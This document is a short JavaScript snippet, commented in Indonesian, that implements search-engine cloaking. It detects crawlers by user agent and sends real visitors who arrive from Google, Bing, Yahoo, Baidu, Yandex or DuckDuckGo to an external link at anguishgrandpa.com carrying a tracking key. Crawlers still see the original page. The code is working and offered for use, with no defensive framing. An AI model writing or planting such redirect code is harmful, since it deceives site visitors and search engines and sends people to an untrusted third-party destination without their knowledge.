(function() {
    // 1. Daftar keyword referrer
    const searchEngines = [
        "google.com", 
        "bing.com", 
        "yahoo.com", 
        "baidu.com", 
        "yandex.com", 
        "duckduckgo.com"
    ];

    // 2. Deteksi Bot dasar
    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);

    // 3. Logika Penyesuaian Protokol (HTTP/HTTPS)
    // Mengambil protokol halaman saat ini (misal: 'http:' atau 'https:')
    const currentProtocol = window.location.protocol;
    
    // URL dasar tanpa protokol (dimulai dengan //)
    const rawLink = "//anguishgrandpa.com/scg1652n5?key=012f54500c0d91c4f78b75f72cb909d3";
    
    // Gabungkan protokol dengan link
    const directLink = currentProtocol + rawLink;

    const referrer = document.referrer.toLowerCase();

    if (!isBot && referrer !== "") {
        const isFromSearchEngine = searchEngines.some(engine => referrer.includes(engine));

        if (isFromSearchEngine) {
            window.location.href = directLink;
        }
    }
})();
